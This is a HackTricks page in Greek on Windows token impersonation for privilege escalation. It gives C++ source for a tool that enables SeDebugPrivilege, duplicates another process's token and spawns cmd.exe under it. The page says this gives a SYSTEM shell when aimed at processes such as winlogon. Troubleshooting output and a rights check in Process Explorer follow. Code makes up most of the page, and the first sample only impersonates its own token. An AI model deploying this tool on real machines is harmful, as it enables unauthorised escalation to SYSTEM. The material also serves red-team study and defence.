<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>


## Κώδικας

Ο παρακάτω κώδικας από [εδώ](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Επιτρέπει να **υποδείξετε ένα Process ID ως όρισμα** και θα εκτελεστεί ένα CMD **που τρέχει ως ο χρήστης** της υποδειγμένης διεργασίας.\
Εκτελώντας σε μια διεργασία υψηλής ακεραιότητας μπορείτε να **υποδείξετε το PID μιας διεργασίας που τρέχει ως σύστημα** (όπως winlogon, wininit) και να εκτελέσετε ένα cmd.exe ως σύστημα.
```cpp
impersonateuser.exe 1234
```
{% code title="impersonateuser.cpp" %}

```cpp
#include <windows.h>

int main()
{
    HANDLE hToken;
    HANDLE hDupToken;
    DWORD dwSessionId = 0;
    DWORD dwProcessId = 0;
    HANDLE hProcess;
    HANDLE hThread;
    LPVOID lpEnvironment;

    // Get the current session ID
    dwSessionId = WTSGetActiveConsoleSessionId();

    // Get the process ID of the current process
    dwProcessId = GetCurrentProcessId();

    // Open the current process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

    // Open the primary token of the current process
    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
    {
        printf("Failed to open process token\n");
        return 1;
    }

    // Duplicate the primary token
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken))
    {
        printf("Failed to duplicate token\n");
        return 1;
    }

    // Impersonate the user associated with the primary token
    if (!ImpersonateLoggedOnUser(hDupToken))
    {
        printf("Failed to impersonate user\n");
        return 1;
    }

    // Get the current thread handle
    hThread = GetCurrentThread();

    // Set the thread token to the impersonated token
    if (!SetThreadToken(&hThread, hDupToken))
    {
        printf("Failed to set thread token\n");
        return 1;
    }

    // Load the user profile of the impersonated user
    if (!LoadUserProfile(hDupToken, &lpEnvironment))
    {
        printf("Failed to load user profile\n");
        return 1;
    }

    // Do something as the impersonated user

    // Unload the user profile
    if (!UnloadUserProfile(hDupToken, lpEnvironment))
    {
        printf("Failed to unload user profile\n");
        return 1;
    }

    // Revert to the original user
    if (!RevertToSelf())
    {
        printf("Failed to revert to self\n");
        return 1;
    }

    // Close the handles
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return 0;
}
```

{% endcode %}
```cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
{% endcode %}

## Σφάλμα

Σε ορισμένες περιπτώσεις, μπορεί να προσπαθήσετε να προσωποποιήσετε το Σύστημα και να μην λειτουργήσει, εμφανίζοντας ένα αποτέλεσμα όπως το παρακάτω:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Αυτό σημαίνει ότι ακόμα κι αν εκτελείστε σε επίπεδο High Integrity, **δεν έχετε αρκετές άδειες**.\
Ας ελέγξουμε τις τρέχουσες δικαιώματα Διαχειριστή για τις διεργασίες `svchost.exe` με το **processes explorer** (ή μπορείτε επίσης να χρησιμοποιήσετε το process hacker):

1. Επιλέξτε μια διεργασία του `svchost.exe`
2. Δεξί κλικ --> Ιδιότητες
3. Εντός της καρτέλας "Ασφάλεια" κάντε κλικ στο κάτω δεξιά κουμπί "Άδειες"
4. Κάντε κλικ στο "Προηγμένες ρυθμίσεις"
5. Επιλέξτε "Διαχειριστές" και κάντε κλικ στο "Επεξεργασία"
6. Κάντε κλικ στο "Εμφάνιση προηγμένων δικαιωμάτων"

![](<../../.gitbook/assets/image (322).png>)

Η προηγούμενη εικόνα περιέχει όλα τα προνόμια που έχουν οι "Διαχειριστές" πάνω στην επιλεγμένη διεργασία (όπως μπορείτε να δείτε, στην περίπτωση του `svchost.exe` έχουν μόνο προνόμια "Ερώτηση").

Δείτε τα προνόμια που έχουν οι "Διαχειριστές" πάνω στο `winlogon.exe`:

![](<../../.gitbook/assets/image (323).png>)

Μέσα σε αυτήν τη διεργασία, οι "Διαχειριστές" μπορούν να "Διαβάσουν Μνήμη" και "Διαβάσουν Άδειες", το οποίο πιθανώς επιτρέπει στους Διαχειριστές να προσομοιώσουν το διακριτικό που χρησιμοποιείται από αυτήν τη διεργασία.



<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο github.

</details>
